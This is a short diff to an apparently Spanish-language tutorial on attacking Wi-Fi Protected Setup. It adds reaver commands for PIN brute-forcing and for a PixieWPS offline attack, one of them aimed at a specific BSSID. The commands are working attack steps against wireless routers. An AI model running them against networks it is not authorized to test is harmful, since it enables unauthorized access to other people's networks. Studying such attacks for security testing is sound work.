@@ -29,4 +29,10 @@ La primera mitad del pin se valida entre los mensajes M1 a M4. SI recibimos el M
 
     wash -i <interfaz_mon>
 
-# COntinuará!
+### Atacar 
+
+    sudo reaver -b <BSSID> -i <interfaz> -v -c <channel>
+
+### PixieWPS attack
+
+    sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v -K
